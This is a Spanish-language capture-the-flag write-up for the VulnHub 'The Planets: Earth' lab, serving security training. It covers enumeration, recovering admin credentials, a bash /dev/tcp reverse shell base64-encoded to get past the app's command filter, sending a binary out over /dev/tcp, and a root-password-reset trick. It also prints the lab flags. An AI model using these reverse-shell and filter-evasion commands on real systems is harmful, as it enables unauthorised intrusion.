---
title: "The Planets: Earth"
excerpt: "[Easy][Vulnhub] Writeup de The Planets: Earth."
header:
 teaser: ""
tags:
  - vulnhub
  - easy
  - writeup
categories:
  - vulnhub
---

[https://www.vulnhub.com/entry/the-planets-earth,755/](https://www.vulnhub.com/entry/the-planets-earth,755/)

Realizar un escaneo nmap a la red para buscar el equipo
```bash
sudo nmap -vvv -sS -sV -O -Pn 192.168.122.0/24
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/1.png){: .align-center}

Saldrá una máquina con varios puertos abiertos

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/2.png){: .align-center}

Realizar un escaneo nmap profundo a la IP que aparece
```bash
sudo nmap -vvv -sS -sV -O  -p- --min-rate 5000 --script vuln -Pn 192.168.122.11 -oG allports
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/3.png){: .align-center}

Aparecerán los puertos `22,80,443` abiertos

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/4.png){: .align-center}

Aparecerán bastantes vulnerabilidades, entre ellas se mostrarán dos DNS que habra que poner en `/etc/hosts` apuntando a la IP de la máquina victima

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/5.png){: .align-center}

Editar el archivo `/etc/hosts` para añadir las DNS
```bash
sudo nano /etc/hosts
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/6.png){: .align-center}

Entrar a la web como `earth.local`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/7.png){: .align-center}

Realizar un escaneo con gobuster a ambas DNS como https
```bash
sudo gobuster dir -u https://earth.local -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/8.png){: .align-center}

```bash
sudo gobuster dir -u https://terratest.earth.local -w /usr/share/wordlists/dirb/common.txt -k
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/9.png){: .align-center}

Reportará que hay un `robots.txt`, acceder a él. Mostrará una lista de directorios.

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/10.png){: .align-center}

Ir a `/testingnotes.txt`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/11.png){: .align-center}

Ir a `testdata.txt`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/12.png){: .align-center}

Usar cyberchef para desencriptar los mensajes de earth.local usando como clave el texto de `testdata.txt`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/13.png){: .align-center}

Mostrará un menaje repetido bastantes veces que es earthclimatechangebad4humans
Usar ese resultado como contraseña en `earth.local/admin/login`

```bash
Usuario: terra
Contraseña: earthclimatechangebad4humans
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/14.png){: .align-center}

Al intentar hacer un reverse shell mostrará que no están permitidas las conexiones, esto es porque detecta que se está introduciendo un comando de reverse shell
```bash
/bin/bash -i >& /dev/tcp/192.168.122.13/4444 0>&1
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/15.png){: .align-center}

Encriptar el comando con base64
```bash
echo "/bin/bash -i >& /dev/tcp/192.168.122.13/4444 0>&1" | base64
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/16.png){: .align-center}

Poner el puerto en escucha
```bash
nc -lvnp 4444
```

IMPORTANTE: Utilizo `ncwrap` que es un alias que he asignado al comando "`rlwrap nc`", para poder usar un shell inverso mejorado.

Para poder usarlo instalar `rlwrap` con `sudo apt install -y rlwrap` y opcionalmente crear un alias que al escribirlo ejecute "`rlwrap nc`"

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/17.png){: .align-center}

Mandar ese comando encriptado indicando que después se desencripte y ejecute

```bash
echo 'L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMTIyLjEzLzQ0NDQgMD4mMQo=' | base64 -d | bash
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/18.png){: .align-center}

Se abrirá un shell inverso

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/19.png){: .align-center}

Al ir a `/var` se podrá ver un directorio llamado `earth_web`
```bash
cd /var
ls –la
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/20.png){: .align-center}

Ir a `earth_web` y mostrar el contenido
```bash
cd earth_web
ls -la
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/21.png){: .align-center}

Leer el archivo `user_flag.txt`
```bash
cat user_flag.txt
Flag: [user_flag_3353b67d6437f07ba7d34afd7d2fc27d]
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/22.png){: .align-center}

Buscar archivos en el sistema con permisos especiales para el usuario actual
```bash
find / -perm -u=s 2>/dev/null
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/23.png){: .align-center}

Saldrá un archivo llamado `reset_root`, al ejecutarlo mostrará un error

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/24.png){: .align-center}

Al intentar hacer un `cat` al archivo este será ilegible

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/25.png){: .align-center}

Por esto será necesario mandar el archivo al equipo atacante para poder revisarlo.

Primero se pondrá un puerto en escucha esperando por la información del archivo y que lo guardará en el equipo:
```bash
nc -nlvp 9002 > reset_root
```

Luego mandar el archivo:
```bash
cat /usr/bin/reset_root > /dev/tcp/192.168.122.13/9002
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/26.png){: .align-center}

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/27.png){: .align-center}

Se recibirá correctamente y el `nc` se cerrará

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/28.png){: .align-center}

Dar permisos de ejecución al archivo `reset_root`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/29.png){: .align-center}

Asegurar que se tiene instalado `strace`, si no instalarlo
```bash
sudo apt install –y strace
```

Comprobar el contenido del archivo `reset_root`
```bash
strace -f ./reset_root
```

Entre todo el contenido mostrará unas líneas que comprueban si existen unos archivos, de existir entonces el script cambia la contraseña del usuario root.

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/30.png){: .align-center}

Crear los archivos en el equipo víctima
```bash
touch /dev/shm/kHgTFI5G /dev/shm/Zw7bV9U5 /tmp/kcM0Wewe
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/31.png){: .align-center}

Ejecutar de nuevo el archivo `reset_root`
```bash
/usr/bin/reset_root
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/32.png){: .align-center}

Ahora habrá cambiado la contraseña de `root` a `Earth`

Cambiar al usuario `root` con la contraseña `Earth`
```bash
su
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/33.png){: .align-center}

Comprobar que el usuario es root
```bash
whoami
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/34.png){: .align-center}

Ir al directorio de root y mostrar el contenido
```bash
cd /root
ls –la
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/35.png){: .align-center}

Leer el archivo `root_flag.txt`
```bash
cat root_flag.txt
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/36.png){: .align-center}

## Flags

Usuario: [user_flag_3353b67d6437f07ba7d34afd7d2fc27d]

Root: [root_flag_b0da9554d29db2117b02aa8b66ec492e]
